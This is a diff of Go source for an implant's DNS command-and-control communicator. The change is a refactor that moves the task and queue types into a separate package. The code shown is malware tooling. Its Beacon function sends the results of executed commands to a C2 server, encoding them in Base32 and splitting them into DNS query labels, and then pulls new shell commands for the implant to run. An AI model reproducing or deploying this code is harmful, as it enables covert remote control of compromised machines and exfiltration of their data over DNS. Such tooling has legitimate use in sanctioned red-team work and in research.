@@ -1,6 +1,7 @@
 package c2communicator
 
 import (
+	"asritha.dev/implant/pkg/task"
 	"encoding/base32"
 	"fmt"
 	"github.com/miekg/dns"
@@ -27,8 +28,8 @@ type DNSC2Communicator struct {
 }
 
 // Beacon sends any pending results to the C2 server, then fetches new tasks.
-// Returns a TaskQueue w/ Tasks of "ShellCommand" type
-func (d *DNSC2Communicator) Beacon(implantID uint, results []Result) (*TaskQueue, error) {
+// Returns a Queue w/ Tasks of "ShellCommand" type
+func (d *DNSC2Communicator) Beacon(implantID uint, results []task.Result) (*task.Queue, error) {
 
 	// 1. Send results
 	if err := d.SendResults(implantID, results); err != nil {
@@ -36,14 +37,14 @@ func (d *DNSC2Communicator) Beacon(implantID uint, results []Result) (*TaskQueue
 	}
 
 	// 2. Fetch new tasks
-	tq := NewTaskQueue()
+	tq := task.NewQueue()
 	newCommandsWithArgs, err := d.GetRequestedCommands(implantID)
 	if err != nil {
 		return nil, fmt.Errorf("get commands: %w", err)
 	}
 
 	for id, commandWithArgs := range newCommandsWithArgs {
-		tq.Enqueue(NewShellCommandTask(id, commandWithArgs))
+		tq.Enqueue(task.NewShellCommand(id, commandWithArgs))
 	}
 
 	return tq, nil
@@ -53,7 +54,7 @@ func (d *DNSC2Communicator) Beacon(implantID uint, results []Result) (*TaskQueue
 // It Base32-encodes the result payload, splits it into label-sized chunks, and embeds those chunks in the QNAME labels using the format:
 //
 //	<implantID>.<taskID>.<chunkCount>.<chunkIndex>.<chunkData>.r.<domain>
-func (d *DNSC2Communicator) SendResults(implantID uint, results []Result) error {
+func (d *DNSC2Communicator) SendResults(implantID uint, results []task.Result) error {
 	for _, result := range results {
 		payload := result.Content
 		if !result.Success {
